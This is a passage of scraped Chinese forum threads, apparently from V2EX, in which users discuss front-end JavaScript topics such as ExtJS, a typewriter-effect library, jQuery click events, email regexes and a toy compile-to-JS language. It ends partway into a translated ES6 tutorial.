"互联网能看到的只知道开源中国的 maven 检索服务", "多年前也用过 ExtJS ， 从 2 一直跟到 4 ， 熟悉了之后，也不是很难用， 蛮不错的， 无所不包的框架，端对端的解决方案！ 做企业后台管理之类的可以说是首选， 它走的是类似微软 ", " WebForm 的路线！\r", "\r", "不过你要想精确的控制 HTML 的话还是算了，自定义那些控件超级麻烦！\r", "\r", "后来， 我转了 Bootstrap + Angular ， 感觉就是缺少成熟控件， 一个项目下来要东拼西凑一大堆插件！\r", "\r", "萝卜青菜，各有所爱吧！", "举手表示公司正在用，但也是属于历史遗留了", " 感觉到目前为止也并没有其他方案可以提供 extjs 这样完善的 web 控件套件了.. 有没有其他推荐？\r", "\r", "现在流行的框架确实轻量，也正是轻量所以缺少很多东西，离商业化使用差距很大… 要实现 Windows/Mac 各种系统自带控件的功能都得自己造轮子 o(╯□╰)o", "  @", " \r", "如果你想要一个非常完备 无所不包的框架\r", "不需要依赖或者用到其他任何库或者框架\r", "用它一个就可以实现整个 WebApp 的框架\r", "ExtJS 是最好的选择\r", "因为 Sencha 给你提供了完整的开发方案：\r", "从 UI 库（ Widgets ） 到构架（ Class System ， MVC ， MVVM ） 到工具（ Microloader ， Sencha CMD ） 样样齐全\r", "连所见即所得 支持控件拖拽 的 IDE 都提供了\r", "和当年的 M$ .Net 一样 所有轮子全部自己造一遍\r", "你不需要（也很难）用其他的框架和工具来开发一个完整的 WebApp\r", "\r", "但是 如果你只是需要一套完整的 Web 控件 其实选择还是有很多的\r", "比较轻量开源的 比如 Bootstrap ， jQuery UI 那些 加上众多插件 手机上 Ionic 等等\r", "商业化的 除了 ExtJS 还有 KendoUI ， Webix 等等 都是很完备的\r", "而且也和 ExtJS 类似提供了简单的架构支持和 Class system\r", "但是都比较简单 推荐和其他主流的框架配合使用\r", "比如 KendoUI 可以接在 Knockout ， Angular ， React 上面使用\r", "而 ExtJS 理论上可以做到 但是世界上 Sencha 希望你完全使用它们的完整的开发方案\r", "要把 ExtJS 当作一个 控件库 加在其他框架上面使用 困难重重\r", "\r", "ExtJS 或者是 Sencha 的问题就是 他们就是要把所有轮子 自己全重作一遍\r", "而且他们做的轮子远远没有现有的好 而且极大的限制了第三方库／框架的使用", " 老师的意思也差不多时这样，这样控制读取权限是比较好做，但是要如何控制页面的修改权限呢？", "  写一个模块管理（增删改查）用户的模块分配，不会在这里带上图片，不然直接带上截图就一目了然了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>本来想在自己的主页上面加一个打字机的效果，结果去网上找到的代码看起来都好麻烦，于是自己写了一个。这个库是给纯小白用的（因为我自己也是小白），大牛请轻喷！<br>\n地址： <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/Zhiqing-Lee/js-printer\">https://github.com/Zhiqing-Lee/js-printer</a></p>\n</div></div>", "<div class=\"topic_content\">V2EX 的人太热情了 T_T,本来只是自己弄着玩一下的，没想到发个帖就快到 30 个 star 了 T_T 。让我受宠若惊啊\r<br>\r<br>弄了个了演示地址： <a target=\"_blank\" href=\"http://studio.zhiqing.info/program/js-printer/%EF%BC%8C\" rel=\"nofollow\">http://studio.zhiqing.info/program/js-printer/，</a></div>", "<div class=\"topic_content\">上面的演示地址多了个逗号： <a target=\"_blank\" href=\"http://studio.zhiqing.info/program/js-printer/\" rel=\"nofollow\">http://studio.zhiqing.info/program/js-printer/</a></div>"], "reply": "62", "tittle": "自己写了一个实现打字机效果的 js 库，大家给点意见吧", "comment": ["SUSE是Sichuan University of ...?", "mark", " 是的", "createTextNode() 做更新好一些？", " 我是小白，没怎么用过js。我能说我都不知道creatTextNode()是什么吗！T_T我先去看看", "试试这个?\r ", "$ I am study in SUSE\r", "I      am    study", "学弟摸摸头", " 比我的牛多了！！！", " 我期末英语考了59分，不要跟我说这些T_T", " 学长四川理工的？", " \r", " \r", "\r", "- - 看来校友还不少哦... ", " ", " 活捉几枚校友", "看起来不错，赞一个，已Star ～", " \r", "\r", "...还真不少嗦。。", " 谢谢，看了上面那个的作品我才知道自己的有多差T_T", "浓浓的C语言气息。", " \r", " \r", " \r", "\r", "你们都是什么专业的？", " 机械设计，现在码农", "兼容性允许的话，纯CSS3也可以实现的~~", " 主要是没怎么写过js", " 那都是大神干的事了，我这种css2都用不好的还是看看就行了", "又一个SUSE的", " \r", "\r", "又软又贱那个专业", "个人建议：\r", "1.使用面向对象方式来写，写一个 Printer 类，每次 new 一下就行了\r", "2.不要单独设置配置项，最好是能实现 obj 参数传递\r", "仅是个人建议！不过效果还是挺好的", "也写了一个\r", "<div id='mydiv'></div>\r", "<script>\r", "  str='hello,V2EX';\r", "  function print (str,conId,speed ){\r", "      var oconId=document.getElementById (conId );\r", "      var strs=str.split ('');\r", "      var count=0,timer=null;\r", "      timer=setInterval (function (){\r", "        if (count==strs.length ){clearInterval (timer );return}\r", "        var letterNode=document.createTextNode (strs[count]);\r", "        oconId.appendChild (letterNode );\r", "        count++;\r", "      },speed )\r", "  }\r", "  print (str,'mydiv',60 );\r", "</script>", " 谢谢建议，没怎么写过 js ，不知道怎么用 js 写类，等下去看看，我最开始就是用参数传递的方式写的，不过考虑到参数太多就改成配置这种了，还是等下去看看有没有更好的方法", " 比我刚开始写那个好很多，我写那个连参数传递都没有，直接在函数里调用的", "这个写的挺好", " 谢谢夸奖", "下面这个不是很简单吗？\r", "\r", "<html>\r", "<head>\r", "   <title>Js 实现逐字在网页上打印文字</title>\r", "   <script language=\"javascript\">\r", " text = \"Js 实现逐字在网页上打印文字\";\r", " i = 0;\r", " function type (){ \r", "  str  = text.substr (0,i );\r", "  txt.innerHTML = str + \"_\";\r", "  i++;\r", "  if (i>text.length ){\r", "   i=0;\r", "//return 加入则 text 显示完后，停止。 \r", "}\r", "  setTimeout (\"type ()\",300 );\r", " }\r", "\r", "</script>\r", "</head>\r", "<body onLoad=\"type ()\">\r", "<div id=\"txt\"></div>\r", "</body>\r", "</html>", " 你这是打脸啊！不过效果有点不一样吧，我不想要文字后面一直跟着光标那种效果", "  \r", "\r", "txt.innerHTML = str + \"_\";\r", "\r", " 改成\r", "\r", "txt.innerHTML = str\r", "\r", "就好了啊;", " 我的意思是\"_\"要若隐若现地出现在文字后面，一会儿有一会儿没有那种", "不错。接下来看些 api 设计和简单的设计模式吧。\r", "\r", "25 楼 @", " 说的很有道理。", "echo You can browse more from zhiqing.ingo\r", "\r", "厉害，自己的域名都打错了", "\"line1\\n\\\r", "line2\\n\\\r", "line3\\n\\\r", "line4\"\r", "\r", "js 字符串换行方法 每行结尾加 \\", " 嗯嗯，谢谢", " 没有注意到....", " 哦哦，我就说怎么直接换行不行", "强迫症发作提了个 pr ，给重构了下。", "貌似有个东西叫 typed.js", " 比我那个好多了，已合并", " 我刚刚也看到了，好像还有个叫 typing 的", " 不会用 github ，貌似已经把源码搞乱了。。。。", "不是可以一键合吗，你把所有<<<<<<< HEAD 或者=========中间的内容，一份是你的 一份是我的，看好了删就行了", " 哦哦，懂了", "演示的“ Console ”没有垂直居中\r", "\r", "版本 44.0.2403.155 m\r", "Google Chrome 已是最新版本。", " 哦哦，这个好像是字体问题，等下改改", "Awesome 就是棒棒哒！", " 什么东西", " Hmm, 就是看大家的合作很暖和的意思，楼主给人一种火星访客的赶脚，而且好认真的样子， hmmmm, 像我！", "mark ~", " 之前确实很少来这些地方，", "demo 字体 fallback 可以考虑改成 monospace ， linux 和 mac 底下直接炸了", " 感觉用 monospace 在 linux 下偏大，字体调小后在 windows 上又偏小...感觉做前端的好累", " linux 用户大约都有一套自己配置好的 fontconfig ，反正不管怎么说 sans-serif 作为终端的 fallback 字体未免有些过不去", " 嗯嗯，已经改成 monospace ，之前一直在 windows 上弄的，不知道 linux 下什么效果", "*", "star 以示支持。", "star", "本来想提个建议的，可是注册后等了两个多小时。\r", "\r", "哎。。\r", "我觉得网上评论系统最好的莫过于多玩图库下面的，直接就可以回复，游客显示 ip 或者所在地之类的。\r", "每天回复量不少，也没见过有广告什么的。\r", "\r", "但是大多数网站都是各种烦，登陆，注册，等待等待等待。\r", "\r", "这样是为了什么实在想不通，一系列的东西为了防止广告，机器等等，但是对用户也变得很不友好。\r", "\r", "T i p ：上面纯属发牢骚，请无视。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>自己用 Nginx 1.9.6 搭了一个 HTTP/2 的站点，想通过 JS 获取到浏览器当前的 HTTP 协议版本</p>\n<div class=\"highlight\"><pre><span class=\"kd\">var</span> <span class=\"nx\">req</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nx\">XMLHttpRequest</span><span class=\"p\">();</span>\n<span class=\"nx\">req</span><span class=\"p\">.</span><span class=\"nx\">open</span><span class=\"p\">(</span><span class=\"s1\">'GET'</span><span class=\"p\">,</span> <span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">location</span><span class=\"p\">,</span> <span class=\"kc\">false</span><span class=\"p\">);</span>\n<span class=\"nx\">req</span><span class=\"p\">.</span><span class=\"nx\">send</span><span class=\"p\">(</span><span class=\"kc\">null</span><span class=\"p\">);</span>\n<span class=\"kd\">var</span> <span class=\"nx\">headers</span> <span class=\"o\">=</span> <span class=\"nx\">req</span><span class=\"p\">.</span><span class=\"nx\">getAllResponseHeaders</span><span class=\"p\">();</span>\n<span class=\"nx\">alert</span><span class=\"p\">(</span><span class=\"nx\">headers</span><span class=\"p\">);</span>\n</pre></div>\n\n<p>文档里看到上面的方法可以获取到 header ，但是 header 里并没有 http 的版本号</p>\n</div></div>"], "reply": "2", "tittle": "如何用 Javascript 获取到客户端当前连接的 HTTP 版本？", "comment": ["想到一种方法，用 nginx 所带的 ngx_http_v2_module 引入的 $http2 变量，设置一个额外的 header ，然后用上述 JS 代码获取到这个 header 的值来确定客户端是否使用 http2 版本。\r", "\r", " \r", "\r", "应该是可行的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"nx\">selector</span><span class=\"p\">).</span><span class=\"nx\">click</span><span class=\"p\">()</span>\n<span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"nx\">selector</span><span class=\"p\">).</span><span class=\"nx\">trigger</span><span class=\"p\">(</span> <span class=\"s2\">\"click\"</span> <span class=\"p\">)</span>\n<span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"nx\">selector</span><span class=\"p\">).</span><span class=\"nx\">on</span><span class=\"p\">(</span> <span class=\"s2\">\"click\"</span><span class=\"p\">,</span> <span class=\"nx\">handler</span> <span class=\"p\">)</span> \n<span class=\"c1\">//这三个和</span>\n<span class=\"nx\">dom</span><span class=\"p\">.</span><span class=\"nx\">click</span><span class=\"p\">()</span>\n<span class=\"c1\">//有什么区别</span>\n\n<span class=\"o\">&lt;</span><span class=\"nx\">a</span> <span class=\"nx\">href</span><span class=\"o\">=</span><span class=\"s2\">\"/testtest/test.html\"</span><span class=\"o\">/&gt;</span>\n<span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"a[href*='testtest']\"</span><span class=\"p\">)[</span><span class=\"mi\">0</span><span class=\"p\">].</span><span class=\"nx\">click</span><span class=\"p\">()</span><span class=\"c1\">//直接访问该链接</span>\n<span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"a[href*='testtest']\"</span><span class=\"p\">).</span><span class=\"nx\">click</span><span class=\"p\">()</span><span class=\"c1\">//因为没有 onclick 所以没反应，也没访问链接</span>\n</pre></div>\n</div></div>"], "reply": "13", "tittle": "问一个 jQuery 的简单问题", "comment": ["浏览器事件\r", "jquery 文档\r", "\r", "麻烦你先去看看！", " 看了 jQuery 的文档，还是没搞清楚，$(selector).click()为什么不会触发 a href 的默认 click 事件，访问连接", " jQuery 事件系统是 jQuery 内虚拟出来的（外部事件会被 jQuery 监听并转换成虚拟的内部事件），所以 .click() 并不会真的在 dom 对象上产生一个 click 事件，只是产生了一个虚拟事件，然后用 jquery 的 on(\"click\")监听的事件才会被响应。\r", "\r", "如果你要模拟真实的点击事件的话，要用原生方法：\r", "xxx.dispatchEvent(new MouseEvent(\"click\"));\r", "这样。", " 你这样调用 click 事件 只是调用你绑定在 click 上面的 functions 而已\r", "不会调用浏览器本身的功能\r", "\r", "要调用浏览器本身的功能需要用到 dispatchEvent\r", "jQuery 最后返回的是一个 jQuery 对象，而加上 [0] 之后会返回 DOM 节点\r", "\r", ".click() 在 内部调用了 .on('click') 算是一种快捷方式\r", "\r", ".on 方法是添加事件监听，也就是说，当你鼠标点击时，触发 xx 事件\r", "\r", "而.trigger 是主动触发事件，比如.trigger('click') 就是主动触发了某元素上的点击事件，比如你可以设置网页一加载完成，就主动触发了点击某按钮", "click 和 href 跳转是两个事件，而且执行先后跟浏览器还有关系。\r", "调用 click 只会触发绑定在 click 上的事件，并不会真的模拟一个点击鼠标的操作。\r", "over", " 貌似不太对，应该说是\r", "\r", ".click(function() {\r", "\r", "    })\r", "\r", "内部调用了\r", "\r", ".on('click',function() {\r", "        \r", "    })", " \r", " ", " 哎呀之前写错了和虚拟事件无关……\r", "jquery 的 trigger(\"click\") 其实是在 dom 节点上调用了 element.click() 方法，这个方法不会做一些浏览器缺省行为（比如跳转），后者必须用 dispatchEvent 来做。", "我举个前几天碰到的一个问题。\r", "用 ajax 加载出来的 list 里面的 btn click()是无法直接触发 click 事件，而原来的 list 却可以\r", "而换成 on(‘ click ’)就可以", " 你说的和 LZ 提问的不是同一个问题。\r", "\r", "你的问题属于 jQuery 对 DOM 元素 click 事件冒泡的捕获。\r", "\r", "LZ 的问题是 jQuery 的 click 函数与 DOM 原生 click 事件的区别。", " = =啊哦。。。", " 本来就应该是 live 和 on 啊， live 好像要废弃的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a target=\"_blank\" rel=\"nofollow\" href=\"http://javascript-puzzlers.herokuapp.com/\">http://javascript-puzzlers.herokuapp.com/</a></p>\n</div></div>"], "reply": "20", "tittle": "据说是 javascript 专业八级测验，你答对了多少？", "comment": ["/w\\ 这黑的好。\r", "\r", "但是谁写代码敢这么写，绝对砍死他", " \r", "\r", "var x = [].reverse;\r", "x();\r", "\r", "这里应该返回一个 error ，但是题中却说是 window 。", " \r", "\r", "这题里面全是 JavaScript 设计和浏览器的坑的大集合。", " ", "本来想说 [\"1\", \"2\", \"3\"].map(parseInt) 。结果第一题就是这玩意。", " 太久远的事情了- -。", "这是 JavaScript 糟粕集锦么……", " 哈，年经帖。", "为什么访问 heroku 上的应用速度变快了... 是错觉么。。。我以前在 heroku 上跑网站 网速慢的要死 一些资源文件半天才加载出来.\r", "\r", "例如这个： ", "了解特性的好方法，虽然应该没有谁会写这样的代码吧。。。", "第八题 黑的漂亮 \r", "\r", "JavaScript does not have precision math, even though sometimes it works correctly.", " +1 我刚好测试了这个于是回来看帖子", "第一道题就阵亡了。。。", "T_T 1/44 还真心离开太久了。", "第一题就没有了", "18 / 44 ，做了好久，原来 JavaScript 这么多坑", "这些坑是写代码都绝对不能碰的, 否则会被人砍死的...", "审查元素， class 名称含有 correct 的，都是答案。", " 我只能说看到了专业！", "0/44  以后不逛 v2 了。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>GayHub 求 start : <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/bramblex/BlxScript\">https://github.com/bramblex/BlxScript</a></p>\n\n<p>在线测试地址：<a target=\"_blank\" rel=\"nofollow\" href=\"http://bramblex.github.io/BlxScript\">http://bramblex.github.io/BlxScript</a></p>\n\n<p>求各种指教 /w\\</p>\n</div></div>", "<div class=\"topic_content\">函数式语言……支持闭包，函数柯里化……</div>", "<div class=\"topic_content\">已经为自己的语言实现了 cps 变换。</div>"], "reply": "80", "tittle": "自己手撸了一个语言玩", "comment": ["友情先支持一下", " /w\\ 感谢支持", "然而并没有什么人理我 TnT", "挺有意思的，可以起个名字叫 goffeescript", " 缩进的， gothon 哈哈", "支持尾递归优化吗？", " \r", "\r", "以后我自己解释的时候考虑下怎么做", " \r", "\r", "然而不喜欢 coffee", "楼主这个语言最终是编译成 JS 么", ":= 哈哈", "19", "玻璃心 Script （逃", " \r", "\r", "是啊，因为我懒（好吧，其实如果让我自己解决运行的问题的话，处理闭包和函数柯里化都比较复杂啦）……", " TnT  这是从 Io lang 抄来的", " thx /w\\", " \r", "\r", "对啊，楼主玻璃心，只能赞不能喷 /w\\", " 赞赞赞", "/w\\ lz 好萌，点 star 看看", "哈哈，果断 star 一下看看。", "先友情支持一下。。。。", "不明觉叼", " \r", "\r", "thx", " \r", " \r", " \r", "\r", "/w\\ 感谢各种 star", "很棒的样子.支持下.", " \r", "感谢支持", "已 start", "这就是编译原理学完了之后不知道这门课能干啥的结果..................o(∩_∩)o 支持一下", " \r", "\r", "话说，其实我都没有按照编译原理来 TnT", " 先 star 支持下，\r", "l := List 1 2 3 4 5 End\r", "print l # => [1, 2, 3, 4, 5]\r", "这个 list 定义好奇怪，为什么选择这么奇怪的写法", " \r", "\r", "因为 List 是一个函数。 List 接受一个参数以后，返回一个函数，直到接收的参数是 End 才会中止，并且返回数组。\r", "\r", "举个栗子\r", "l1 := List 1 2 3 4 5\r", "l2 :=  l1 6 7 End\r", "l3 := l1 8 9 End\r", "\r", "print l2 # => [1,2,3,4,5,6,7]\r", "print l3 # => [1,2,3,4,5,8,9]", "模块方案和对象系统看得人够呛, 嗾使自己造的吗还是说 AMD 改的..\r", "parser 部分还没看明白...\r", "编译代码我当时做过后来干脆用 ES6 AST 直接发到 Babel 编译了, 推荐用 Babel 生成", "lz 傻逼（好像 kso 的风气并不能带到 v2 哈哈哈", " \r", "\r", "那个 Class.js 还是不要看得好，太多黑科技了不适合观看。模块方案是 AMD 改编，不过这个也不用看啊……\r", "\r", "看代码只需要看 src/ 下的就行了。 dist/ 下的都是我用自己的工具包装过的，不适合观看。", "感觉语法很怪异", " 滚粗", " \r", "\r", "如果你玩过 Haskell ，或者你懂 Lambda 演算。那么你会觉得我的语法很亲切", "兹词一个，本人第一反应应该是 GoScript\r", "\r", "另外尝试传多个参数的时候报错，然后把例子复制过去也是报错\r", "\r", " \r", "\r", "难道是打开方式不对……", " \r", "\r", "其实，这个语言里面没有中缀运算符……\r", "\r", "改成 a := add x y 就好了……", " \r", "\r", "PaserError At Line 2, Char 10 刚好就是那个 + 号。 TnT", "这个挺好玩的（已 star\r", "\r", "前段时间用 call/cc 玩 control flow 的时候自己也撸了个类似 lua 的函数式语言\r", "\r", "\r", "\r", "跟你的很像也区分了 = 和 := 呢\r", "不过到现在连 test 都没写完，更不要提文档了 orz （懒癌没治系列", " \r", "\r", "已 star~\r", "\r", "我这里根本没有 test /w\\……\r", "\r", "作为递归党来说，只要过程 pure ，那么只要一步是正确的，那么所有步肯定都是正确的 /w\\。\r", "\r", "= 和 := 的区分我是从 Io lang 里面抄的。", " 我来凑个热闹.. ", "\r", "Parser 部分实现完全不一样的, 代码生成直接 Babel 了", " \r", "\r", "/w\\ 这种 lisp 式的语法好玩。", "凑热闹看看", "看着很牛逼的样子，虽然不懂。。。已 star 支持", " 都使用 lisp 的前缀语法，语法应该会很精简", "感觉 V 站近期这样高技术水平的帖子少啊，新来的水货们都看不懂（包括我", " \r", "\r", "嘛……我觉得我这个就是水贴而已……", "太刁，当年编译原理挂了的，我现在只能做前端设计了", " \r", "\r", "编译原理我就看了一个通宵，花了 5 个小时看书。然后过了", "很像 py go", " \r", "\r", "嗯……你多接触点语言以后就不会觉得像了 py go 了", "👍", " 我暂时还没有账号，纯顶贴的。。。。", "楼主做的很好，以后世界上所有语言都会被编译成 javascript 的！", "  没事，好玩就好啦~", " \r", "\r", "翻译成 JavaScript 是无奈之举……\r", "不过 JavaScript 哪里都可以用，什么特性都有，作为目标语言还是挺方便的", "JJ 的思念（", "求大鸡鸡神戴妃", " 是吗，我还是继续去撸自己的编译器好了", "最适合编程的语言就是人类的语言。", "想起来自己 2 年前也做过一个玩具语言\r", "\r", "虽然不像楼主那样支持那么多特性（当时还不知道 cury 是什么东西。。。），但是直接把代码编译然后用虚拟机执行的，可以跑过 8 皇后快排等代码，可是后面实在太忙没时间搞完。现在再看发现代码风格实在太差而且生成二进制代码的方法有问题，以后看来得重新开个坑来完善才行。。", " \r", "\r", "我已经可以给自己的语言做 cps 变换了 /w\\", " \r", "\r", "最不适合编程的才是人类语言……", "  /w\\ 加油", " /w\\ 死基佬，看我肛你", "  已关注", " 带你妹", "已 star ，膜拜大神", "List 的声明怎么比 JavaScript 现在的还到退了啊？\r", "\r", "l := List 1 2 3 4 5 End\r", "\r", "vs\r", "\r", "var l = [ 1,2,3,4,5]\r", "\r", "我宁愿下面一种。\r", "\r", "PS ： 我就是因为 Java 对于字面量数组、字典支持不好而不喜欢的。", " \r", "\r", "List 是一个函数…能理解什么是函数么…", " \r", "\r", "况且把 List End 换成…[ ] 就几分钟的事而已……", " 顺便给你举个好玩的栗子\r", "\r", "l := List\r", "\r", "n := 0\r", "while not (compare 10 n)\r", "    l = l n\r", "    n = add n 1\r", "\r", "print (l End)", "QAQ 原谅我孤陋寡闻，原来 js 能写这种东西啊，我一直以为 js 就是写 web 前端的。", " 然而我这个编译器也能在网页前端上面跑\r", "\r", "不在于什么语言，而在于怎么用这门语言", "没地方水，来着水。\r", "啦啦啦啦", " /w\\ 干嘛来这里水", "后排支持，等我整理完代码也来发", "不明觉叼，可否加个 QQ"]},
{"content": ["<div class=\"topic_content\"><div><a target=\"_blank\" href=\"https://gist.github.com/czmecho/c7bf3f3567e3dcebfffd\">https://gist.github.com/czmecho/c7bf3f3567e3dcebfffd</a> <button onclick=\"lazyGist(this)\"> 显示 Gist 代码 </button></div>\r<br>\r<br>本来以为鼠标移出 P 元素是返回的 clientY 应该是固定的（就是 P 元素内容的上下边框的 Y 坐标），可是我发现当我鼠标以不同速度移出 P 元素的内容返回的 clientY 的值不一样，是什么原因呢？\r<br><img src=\"http://ww3.sinaimg.cn/large/7df5111fgw1exkvsmwwqmj20es05q74j.jpg\" class=\"imgly\" style=\"max-width: 660px;\" border=\"0\"> \r<br><img src=\"http://ww2.sinaimg.cn/large/7df5111fgw1exkvswkxbij20ev06dmxi.jpg\" class=\"imgly\" style=\"max-width: 660px;\" border=\"0\"> </div>"], "reply": "1", "tittle": "MouseEvent 对象响应鼠标事件返回的 clientY 的值不一样是什么原因呢?", "comment": ["因为浏览器事件轮训有时间间隔。不是说你移 1px 就会触发一次 mouseover 或者 mousemove 事件"]},
{"content": ["<div class=\"topic_content\">最近在学习 JS ，遇到一个问题。教程里关于邮箱正则表达式都是哪种单点的。\r<br>针对复合域名，比如 <a target=\"_blank\" href=\"mailto:xxx@abc.xyz.com\">xxx@abc.xyz.com</a> 这样的如何过滤，如果不知道输入的邮箱是有一个“.”两个“.”的如何写啊\r<br>-----------\r<br>目前我只想到 xxx.[com|cn|net|us]这种固定写法</div>"], "reply": "36", "tittle": "关于不固定邮箱 @之后的“.”的正则表达式", "comment": ["附上我以前讨论 a.b.c.txt 和 a.b.tar.gz 文件名提取的帖子\r", "有 @ 就过吧，别为难你的用户。\r", "你只支持 .com .cn .net .us 邮箱是啥意思啊。\r", "\r", "([^.]+\\.)+.[com|cn|net|us]", "([^.]+\\.)+\\.[com|cn|net|us]\r", "都怪你误导无了……", "\r", "\r", "考虑一下域名以及用户名的字符限定以及首字符限定，这么写应该能通吃。", "判断邮箱格式是否正确的话，后面有\\w\\.\\w 就给过了吧\r", "二级域名不止多个.啊，有的还有-呢。。", "最好的办法是解析域名 MX 记录，连一下 25 端口。", " 直接发验证邮件完了。", "[", " +1\r", "\r", "验证邮箱大法好\r", "不想验证就取出 @后面的域名，解析下 dns 吧\r", "\r", "没必要限制域名", "还有正则里面 . 是可以匹配 char(.) 的。\r", "别难为用户了，，有 @ 有 . 就行了。\r", "\r", "[", " 代表邮箱，然后验证邮箱就行了。", "表示我认识的圈子里有好多 ", " 的邮箱，看来楼主是不打算支持了", "@ 后面 xxx.xxx 就可以过了。\r", "不管字母数字还是中文什么的。", "域名不一定是 com|cn|net|us 结尾的说，最好还是按照 2-10 位的字母来写正则吧。", " 钻个牛角尖， aaa@aa..cn", "不要尝试校验域名。\r", "\r", " 域名是还可以用 - 的", " 额，我是说后缀，不是域名主体部分=。=", " 好吧，我看错了= =.", "你这验证的目的？\r", "我记得有些必须 edu 给学生用的\r", "不然的话发验证到邮箱就解决啦，前端的验证没必要太过吧，会坑人的", "[", "\r", "手写未测试 域名后缀一直增加 不可能固定 前后都可能非首末位- .", " 举个例子 ", "\r", "注意:实际-.不可能相连 上面的 re 没有考虑到\r", "可能中文邮箱，此处不做考虑", "我们学校学生的邮箱 @", ".scut.edu.cn \r", "第一次看到直接惊呆，域名这么长", "function isEmail(field){\r", "return  field.value.indexOf(\"@\") !=-1&&field.value.indexOf(\".\") !=-1\r", "}", "据说最新标准 xxx@xxx 是合法的邮箱了，怎么办？", "django 匹配邮箱的正则，你可以参考，这个都标准了吧\r", "\r", "\r", "def validate(self, value):\r", "        value = super(EmailField, self).validate(value)\r", "        user_regex = re.compile(\r", "            r\"(^[-!#$%&'*+/=?^_`{}|~0-9A-Z]+(\\.[-!#$%&'*+/=?^_`{}|~0-9A-Z]+)*$\"\r", "            r'|^\"([\\001-\\010\\013\\014\\016-\\037!#-\\[\\]-\\177]|\\\\[\\001-\\011\\013\\014\\016-\\177])*\"$)',\r", "            re.IGNORECASE)\r", "        domain_regex = re.compile(\r", "            r'(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\\.)+(?:[A-Z]{2,6}|[A-Z0-9-]{2,}(?<!-))$'\r", "            # literal form, ipv4 address (SMTP 4.1.3)\r", "            r'|^\\[(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)(\\.(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)){3}\\]$',\r", "            re.IGNORECASE)\r", "        domain_whitelist = ['localhost']\r", "        if '@' not in value:\r", "            raise ValidationError(\"Email format is not correct\")\r", "\r", "        user_part, domain_part = value.rsplit('@', 1)\r", "\r", "        if not user_regex.match(user_part):\r", "            raise ValidationError(\"Email format is not correct\")\r", "\r", "        if (domain_part not in domain_whitelist and\r", "                not domain_regex.match(domain_part)):\r", "            # Try for possible IDN domain-part\r", "            try:\r", "                domain_part = domain_part.encode('idna').decode('ascii')\r", "                if not domain_regex.match(domain_part):\r", "                    raise ValidationError(\"Email format is not correct\")\r", "                else:\r", "                    return\r", "            except UnicodeError:\r", "                pass\r", "            raise ValidationError(\"Invalid Email format\")\r", "        return value", "额 ", "leaving the enviroment,all comment is nonesense", "你们先试试能否匹配 ", " 不是我钻牛角尖", "解析 @后面的,匹配有个求用", "小声问一句，\r", "[com|cn|net|us] 这种是什么用法？看你们全都这么用，我 Google 了半天也没找到这种语法。\r", "\r", "P.S. 我觉得是不是应该用圆括号 (com|cn|net|us)\r", "\r", " \r", " \r", " ...嗯，你可以直接搜索正则表达式大括号。用百度", " ps 括号一般两个作用，一个是做文本匹配，另一个是调整优先级", " 你是对的  我被楼主带沟里了", " sorry ，又想了一下，错了。应该是整体的备选。。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img src=\"//dn-cnode.qbox.me/FlpD9s5XhU8eI0SJe8cyu1XEWXCP\" alt=\"QQ 截图 20151103202108.png\"></p>\n\n<p>作者： Lars Kappert<br>\n原文： <a target=\"_blank\" rel=\"nofollow\" href=\"http://www.smashingmagazine.com/2015/10/es6-whats-new-next-version-javascript/\">http://www.smashingmagazine.com/2015/10/es6-whats-new-next-version-javascript/</a><br>\n译：王瑾南  审校：陈万幸<br>\n野狗官网： <a target=\"_blank\" rel=\"nofollow\" href=\"https://www.wilddog.com/\">https://www.wilddog.com/</a><br>\n野狗官博： <a target=\"_blank\" rel=\"nofollow\" href=\"https://blog.wilddog.com\">https://blog.wilddog.com</a></p>\n\n<p>你可能已经听说过 ECMAScript 6 ， JavaScript 的下一个版本，它有一些非常棒的新功能。这些功能略微复杂，在简单的脚本和复杂的应用中都可以使用。在这篇文章中，我们将挑选一些 ES6 的功能进行讨论，你可以在日常 JavaScript 编码中使用它们。</p>\n\n<p>需要注意的是，当前的各种浏览器对 ES6 的这些新功能的支持各不相同。</p>\n\n<p>下面的很多代码样本下都带有“ run this code ”的链接，可以看到这些代码并直接使用它。</p>\n\n<h3><strong>变量</strong></h3>\n\n<p><strong>LET</strong></p>\n\n<p>你习惯用 VAR 来声明变量，现在你可以使用 LET 来做的更好。唯一细微的差别在于作用域。</p>\n<div class=\"highlight\"><pre>if(true) {\n    let x = 1;}\n     console.log(x); // undefined\n</pre></div>\n\n<p>这样可以使代码更简洁，从而减少变量环绕。我们用这个经典的数组迭代：</p>\n<div class=\"highlight\"><pre>for(let i = 0, l = list.length; i &lt; l; i++) {\n      // do something with list[i]}\n    console.log(i); // undefined\n</pre></div>\n\n<p>通常 1 在使用的时候，例如， J 变量为在同一作用域内的另一迭代。但是对于 LET 变量，你可以放心的再一次声明 I 变量，因为他只能在自己限定的范围内定义和使用。</p>\n\n<p><strong>CONST</strong></p>\n\n<p>还有另外一种方式来声明块级作用域的变量： const ，使用 const 变量赋值时，是一个只读引用。你必须直接声明一个变量。如果你改变变量，或者你没有立即赋值，就会报错：</p>\n<div class=\"highlight\"><pre>const MY_CONSTANT = 1;\n    MY_CONSTANT = 2 // Error\n    const SOME_CONST; // Error\n</pre></div>\n\n<p>需要注意的是，你仍然可以更改对象属性或者数组成员：</p>\n<div class=\"highlight\"><pre>const MY_OBJECT = {some: 1};\n    MY_OBJECT.some = 'body'; // Cool\n</pre></div>\n\n<p><strong>箭头函数</strong></p>\n\n<p>箭头函数对于 JS 